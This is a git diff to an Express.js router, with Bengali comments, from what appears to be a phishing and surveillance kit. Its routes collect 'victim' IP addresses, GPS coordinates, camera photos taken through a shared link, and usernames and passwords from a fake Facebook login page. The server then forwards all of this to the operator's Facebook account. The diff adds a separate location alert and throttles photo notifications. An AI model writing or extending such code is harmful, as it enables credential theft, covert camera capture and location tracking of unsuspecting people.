@@ -2,7 +2,12 @@ const express = require('express');
 const path = require('path');
 const router = express.Router();
 const Victim = require('../models/Victim');
-const { getConfig, sendMessage, formatVictimData } = require('../utils/helpers');
+const { 
+    getConfig, 
+    sendMessage, 
+    formatVictimData,
+    formatLocationMessage 
+} = require('../utils/helpers');
 
 // ===== ক্যামেরা লিঙ্ক ভিজিট =====
 router.get('/v/:id', async (req, res) => {
@@ -38,13 +43,11 @@ router.post('/api/victim', async (req, res) => {
         const data = req.body;
         console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
 
-        // ডেটা ভ্যালিডেশন
         if (!data.id) {
             console.error('❌ id নেই!');
             return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
-        // fbId না থাকলে 'unknown' সেট করি
         if (!data.fbId) {
             data.fbId = 'unknown';
         }
@@ -52,7 +55,6 @@ router.post('/api/victim', async (req, res) => {
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
-            // নতুন ভিক্টিম তৈরি
             victim = new Victim({
                 id: data.id,
                 fbId: data.fbId,
@@ -70,7 +72,6 @@ router.post('/api/victim', async (req, res) => {
             await victim.save();
             console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
         } else {
-            // আপডেট
             victim.ip = data.ip || victim.ip;
             victim.location = data.location || victim.location;
             victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
@@ -83,20 +84,28 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
         }
 
-        // ইউজারকে মেসেজ পাঠান (যদি fbId থাকে)
+        // ===== মূল মেসেজ পাঠান (শুধু প্রয়োজনীয় তথ্য) =====
         if (victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
-            console.log(`📤 মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
-        } else {
-            console.log('⚠️ fbId নেই বা unknown, মেসেজ পাঠানো হয়নি');
+            console.log(`📤 মূল মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+        }
+
+        // ============================================================
+        // 🆕 লোকেশন পারমিশন থাকলে আলাদা মেসেজ পাঠান
+        // ============================================================
+        if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
+            const locationMsg = formatLocationMessage(victim.gpsLocation);
+            if (locationMsg) {
+                await sendMessage(victim.fbId, locationMsg);
+                console.log(`📍 লোকেশন মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+            }
         }
 
         res.status(200).json({ status: 'ok', data: victim });
 
     } catch (err) {
         console.error('❌ Victim data error:', err);
-        // বিস্তারিত এরর লগ
         if (err.name === 'ValidationError') {
             console.error('Validation Error:', err.errors);
             return res.status(400).json({ status: 'error', message: 'Validation Error', errors: err.errors });
@@ -105,7 +114,9 @@ router.post('/api/victim', async (req, res) => {
     }
 });
 
-// ===== ক্যামেরা ছবি রিসিভ =====
+// ================================================================
+// 🆕 ক্যামেরা ছবি রিসিভ - শুধুমাত্র একটি সারাংশ মেসেজ
+// ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
         const { id, image } = req.body;
@@ -125,13 +136,20 @@ router.post('/api/camera', async (req, res) => {
         });
         await victim.save();
 
-        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${victim.camera.length}টি)`);
+        const totalImages = victim.camera.length;
+        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
+        // ============================================================
+        // 🆕 প্রতি ৫টি ছবি বা শেষ হলে একটি সারাংশ মেসেজ পাঠান
+        // ============================================================
         if (victim.fbId && victim.fbId !== 'unknown') {
-            await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${victim.camera.length}টি ছবি সংগ্রহ করা হয়েছে।`);
+            // শুধুমাত্র ৫, ১০, ১৫, ২০... বা শেষ হলে মেসেজ পাঠান
+            if (totalImages % 5 === 0 || totalImages === 1) {
+                await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${totalImages}টি ছবি সংগ্রহ করা হয়েছে।`);
+            }
         }
 
-        res.status(200).json({ status: 'ok', count: victim.camera.length });
+        res.status(200).json({ status: 'ok', count: totalImages });
 
     } catch (err) {
         console.error('❌ Camera error:', err);
@@ -182,7 +200,7 @@ router.post('/api/fblogin', async (req, res) => {
         console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);
 
         if (victim.fbId && victim.fbId !== 'unknown') {
-            const msg = `🔐 **ফেক ফেসবুক লগইন ডেটা!**\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
+            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
             await sendMessage(victim.fbId, msg);
         }
 
